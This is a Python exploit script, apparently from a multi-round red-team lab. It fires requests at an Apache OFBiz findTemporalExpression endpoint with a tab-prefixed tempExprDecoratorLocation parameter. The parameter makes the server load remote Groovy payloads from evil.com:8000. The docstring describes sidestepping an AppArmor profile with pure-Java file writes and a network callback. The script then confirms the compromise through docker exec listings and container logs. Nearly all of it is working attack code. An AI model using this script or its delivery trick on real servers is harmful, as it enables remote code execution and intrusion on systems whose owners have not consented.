# -*- coding: utf-8 -*-
"""RT-4 OFBiz firing: RV (rt3_final groovy-touch, expected exec-denied) + rt4 pure-Java groovy payload.
Reuses the RT-3 whitespace-prefix (%09) delivery; AppArmor-facing change is the payload ACTION:
aa-ofbiz grants no exec outside /usr/local/openjdk-8, so 'touch'.execute() dies, but
java.io.File APIs + network are allowed (hsperfdata_root rule + full inet)."""
import subprocess
import sys

import requests
import urllib3

urllib3.disable_warnings()

TARGET = "https://127.0.0.1:18081"
URI = "/webtools/control/main/findTemporalExpression"
SHOTS = [
    ("RV rt3_final (groovy touch /tmp/pwn_rt3_final)",
     "tempExprDecoratorLocation=%09http://evil.com:8000/payloads/rt3_final.xml"),
    ("RT4 pure-java groovy (hsperfdata + ofbiz tree + callback)",
     "tempExprDecoratorLocation=%09http://evil.com:8000/payloads/rt4_ofbiz.xml"),
]

s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"

for label, body in SHOTS:
    r = s.post(TARGET + URI, data=body,
               headers={"Content-Type": "application/x-www-form-urlencoded"},
               timeout=60, allow_redirects=False)
    print("[*] %s -> HTTP %s (%dB)" % (label, r.status_code, len(r.content)))

print("\n=== truth: /tmp + hsperfdata ===")
r = subprocess.run(["docker", "exec", "multi-round-lab-ofbiz-1", "ls", "-l", "--full-time",
                    "/tmp", "/tmp/hsperfdata_root"], capture_output=True, text=True)
print(r.stdout + r.stderr)
print("=== truth: ofbiz tree ===")
r = subprocess.run(["docker", "exec", "multi-round-lab-ofbiz-1", "ls", "-l", "--full-time",
                    "/usr/src/apache-ofbiz/pwn_rt4_ofbiz_t2"], capture_output=True, text=True)
print(r.stdout + r.stderr)
print("=== infra log (rt4 / rt3_final) ===")
r = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "5m"],
                   capture_output=True, text=True)
for line in (r.stdout + r.stderr).splitlines():
    if "rt4" in line or "rt3_final" in line:
        print("[infra] " + line)
